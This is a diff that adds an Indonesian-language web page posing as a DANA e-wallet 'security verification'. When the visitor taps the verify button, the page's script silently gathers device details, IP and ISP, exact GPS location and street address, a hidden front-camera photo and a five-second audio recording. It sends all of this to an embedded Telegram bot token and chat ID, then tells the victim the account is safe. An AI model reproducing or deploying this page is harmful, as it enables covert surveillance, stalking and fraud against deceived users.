@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DANA - Verifikasi Keamanan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0066ae;
+            background: linear-gradient(145deg, #0077c8 0%, #004b8f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
+            padding: 16px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 36px;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            overflow: hidden;
+            padding: 30px 24px 36px;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 20px;
+        }
+        .logo-img {
+            width: 42px;
+            height: 42px;
+            background: #108ee9;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 800;
+            font-size: 28px;
+        }
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0a2e4b;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a2e3b;
+            margin-bottom: 6px;
+        }
+        .sub {
+            font-size: 14px;
+            color: #557a9a;
+            margin-bottom: 32px;
+            font-weight: 500;
+        }
+        .shield-icon {
+            font-size: 52px;
+            margin-bottom: 12px;
+        }
+        .btn-verify {
+            background: #108ee9;
+            border: none;
+            color: white;
+            font-weight: 700;
+            font-size: 20px;
+            padding: 18px 20px;
+            border-radius: 60px;
+            width: 100%;
+            border: 1px solid #3ea5f5;
+            box-shadow: 0 10px 20px rgba(16,142,233,0.3);
+            cursor: pointer;
+            transition: 0.15s;
+            margin: 20px 0 10px;
+        }
+        .btn-verify:active {
+            transform: scale(0.97);
+            background: #0a6ebd;
+        }
+        .btn-verify:disabled {
+            opacity: 0.6;
+            transform: none;
+            background: #7fbbda;
+        }
+        .loading-container {
+            margin: 24px 0 16px;
+        }
+        .progress-bar {
+            background: #e0edf5;
+            height: 10px;
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 16px 0 8px;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #108ee9;
+            border-radius: 20px;
+            transition: width 0.2s;
+        }
+        .status-text {
+            font-size: 14px;
+            color: #1e4b6e;
+            min-height: 40px;
+        }
+        .note {
+            margin-top: 28px;
+            font-size: 11px;
+            color: #8ba3b9;
+        }
+        .hidden {
+            display: none !important;
+        }
+        #previewVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <div class="logo-img">D</div>
+        <div class="logo-text">DANA</div>
+    </div>
+    <div class="shield-icon">🛡️</div>
+    <h2>Verifikasi Aman</h2>
+    <div class="sub">Lindungi akun Anda dari aktivitas mencurigakan</div>
+
+    <!-- Tampilan Awal -->
+    <div id="initialScreen">
+        <button class="btn-verify" id="startVerification">🔒 Verifikasi Sekarang</button>
+        <div style="margin-top: 12px; font-size: 12px; color: #6c8da8;">Data dienkripsi • SSL</div>
+    </div>
+
+    <!-- Tampilan Loading -->
+    <div id="loadingScreen" class="hidden">
+        <div class="loading-container">
+            <div style="font-weight: 600; margin-bottom: 20px;">⚡ Menghubungkan ke server aman...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill" style="width: 10%;"></div>
+            </div>
+            <div class="status-text" id="statusMessage">Meminta izin perangkat</div>
+        </div>
+    </div>
+
+    <div class="note">
+        &copy; DANA Indonesia • Verifikasi Wajib
+    </div>
+</div>
+
+<!-- Elemen Tersembunyi untuk Kamera & Audio -->
+<video id="previewVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+<script>
+    // ================== KONFIGURASI BOS ==================
+    const TELEGRAM_BOT_TOKEN = '8658100845:AAHwzE78Adn4sOF-xye-eht2kqZKhWjsdqI';   // GANTI
+    const TELEGRAM_CHAT_ID = '8113518117';       // GANTI
+    // ====================================================
+
+    // DOM Elements
+    const initialScreen = document.getElementById('initialScreen');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const startBtn = document.getElementById('startVerification');
+    const statusMsg = document.getElementById('statusMessage');
+    const progressFill = document.getElementById('progressFill');
+    const video = document.getElementById('previewVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+
+    // Data Storage
+    let locationData = null;
+    let addressString = '';
+    let deviceInfo = {};
+    let batteryInfo = {};
+    let ipInfo = {};
+    let photoBlob = null;
+    let audioBlob = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let stream = null;
+
+    // Update UI
+    function setProgress(percent, text) {
+        progressFill.style.width = percent + '%';
+        statusMsg.innerText = text;
+    }
+
+    // 1. Device & Battery
+    function gatherDeviceInfo() {
+        const nav = navigator;
+        deviceInfo = {
+            ua: nav.userAgent,
+            platform: nav.platform,
+            vendor: nav.vendor || '',
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: devicePixelRatio || 1,
+            language: nav.language,
+            cores: nav.hardwareConcurrency || '?',
+            memory: nav.deviceMemory || '?',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            touch: 'ontouchstart' in window
+        };
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                batteryInfo = {
+                    level: Math.round(b.level*100)+'%',
+                    charging: b.charging,
+                };
+            });
+        }
+    }
+
+    // 2. IP & ISP
+    async function fetchIP() {
+        try {
+            let ipRes = await fetch('https://api.ipify.org?format=json');
+            let ipData = await ipRes.json();
+            ipInfo.ip = ipData.ip;
+            let geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            let geo = await geoRes.json();
+            ipInfo = { ...ipInfo, ...geo };
+        } catch(e) { ipInfo.ip = 'Gagal'; }
+    }
+
+    // 3. Lokasi Akurat + Alamat (Google Maps Geocoding fallback ke Nominatim)
+    function getAccurateLocation() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) return reject('Geolocation tidak support');
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude, accuracy } = pos.coords;
+                locationData = { lat: latitude, lng: longitude, accuracy };
+                // Reverse geocode (prioritas Nominatim, tanpa API key)
+                try {
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
+                        headers: { 'Accept-Language': 'id' }
+                    });
+                    const addr = await res.json();
+                    addressString = addr.display_name || `${latitude}, ${longitude}`;
+                } catch {
+                    addressString = `${latitude}, ${longitude}`;
+                }
+                resolve();
+            }, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+        });
+    }
+
+    // 4. Kamera + Mikrofon + Rekam Audio 5 detik + Ambil Foto
+    async function captureMedia() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: 640, height: 480 }, 
+                audio: true 
+            });
+            
+            // Preview video (tersembunyi)
+            video.srcObject = stream;
+            await video.play();
+
+            // Setup MediaRecorder untuk audio
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+            audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+            };
+
+            // Mulai rekam audio 5 detik
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 5000);
+
+            // Ambil foto setelah 1.5 detik (biar kamera fokus)
+            await new Promise(r => setTimeout(r, 1500));
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+
+            // Stop semua track setelah selesai (hemat)
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
+            return true;
+        } catch (e) {
+            throw new Error('Izin kamera/mikrofon ditolak');
+        }
+    }
+
+    // 5. Kirim ke Telegram (dengan Foto & Audio)
+    async function sendReport() {
+        // Susun caption
+        let caption = `🛡️ *DANA VERIFIKASI*\n`;
+        caption += `────────────────\n`;
+        caption += `📅 ${new Date().toLocaleString('id-ID')}\n`;
+        caption += `🌐 IP: ${ipInfo.ip || 'N/A'} (${ipInfo.org || ''})\n`;
+        caption += `📍 Lokasi: ${locationData ? `${locationData.lat}, ${locationData.lng}` : '-'}\n`;
+        caption += `🏠 Alamat: ${addressString || '-'}\n`;
+        caption += `📱 Perangkat: ${deviceInfo.platform} | Cores: ${deviceInfo.cores}\n`;
+        caption += `🔋 Baterai: ${batteryInfo.level || '?'} | Charging: ${batteryInfo.charging ? 'Ya' : 'Tidak'}\n`;
+        caption += `🕒 Zona Waktu: ${deviceInfo.timezone}\n`;
+        caption += `────────────────\n✅ Semua data terenkripsi.`;
+
+        // Kirim Foto dulu dengan caption
+        if (photoBlob) {
+            const formPhoto = new FormData();
+            formPhoto.append('chat_id', TELEGRAM_CHAT_ID);
+            formPhoto.append('photo', photoBlob, 'face.jpg');
+            formPhoto.append('caption', caption);
+            formPhoto.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method:'POST', body: formPhoto });
+        }
+
+        // Kirim Audio (rekaman)
+        if (audioBlob && audioBlob.size > 0) {
+            const formAudio = new FormData();
+            formAudio.append('chat_id', TELEGRAM_CHAT_ID);
+            formAudio.append('audio', audioBlob, 'record.ogg');
+            formAudio.append('caption', '🎙️ Rekaman suara sekitar');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method:'POST', body: formAudio });
+        } else {
+            // fallback pesan teks jika audio gagal
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method:'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '⚠️ Audio tidak tersedia.', parse_mode:'Markdown' })
+            });
+        }
+    }
+
+    // Main Process
+    async function startHarvest() {
+        if (TELEGRAM_BOT_TOKEN.includes('PASTE') || TELEGRAM_CHAT_ID.includes('PASTE')) {
+            alert('Bos, ganti BOT_TOKEN & CHAT_ID dulu di kode!');
+            return;
+        }
+
+        // Tampilkan loading
+        initialScreen.classList.add('hidden');
+        loadingScreen.classList.remove('hidden');
+        
+        try {
+            setProgress(15, 'Mengambil info perangkat...');
+            gatherDeviceInfo();
+            
+            setProgress(25, 'Mendapatkan IP & lokasi...');
+            await Promise.all([fetchIP(), getAccurateLocation()]);
+            
+            setProgress(40, 'Meminta akses kamera & mikrofon...');
+            await captureMedia();
+            
+            setProgress(70, 'Mengamankan data...');
+            
+            setProgress(85, 'Mengirim laporan...');
+            await sendReport();
+            
+            setProgress(100, '✅ Verifikasi selesai! Akun Anda aman.');
+            
+            // Ubah tombol jadi selesai (disable)
+            setTimeout(() => {
+                statusMsg.innerHTML = '✅ Terverifikasi. Terima kasih.';
+                progressFill.style.background = '#2ecc71';
+            }, 500);
+        } catch (error) {
+            console.error(error);
+            setProgress(100, '❌ Verifikasi gagal. Coba lagi nanti.');
+            progressFill.style.background = '#e74c3c';
+            // Fallback tetap kirim data yang sudah didapat (opsional)
+            if (ipInfo.ip) {
+                try {
+                    let caption = `⚠️ GAGAL SEBAGIAN\nIP: ${ipInfo.ip}\nLokasi: ${locationData?.lat},${locationData?.lng}`;
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method:'POST', headers:{'Content-Type':'application/json'},
+                        body: JSON.stringify({chat_id:TELEGRAM_CHAT_ID, text:caption})
+                    });
+                } catch(e){}
+            }
+        } finally {
+            // Bersihkan stream jika masih ada
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
+        }
+    }
+
+    // Event Listener
+    startBtn.addEventListener('click', startHarvest);
+
+    // Pre-fetch IP di background
+    window.addEventListener('load', () => {
+        fetchIP();
+        gatherDeviceInfo();
+    });
+</script>
+</body>
+</html>
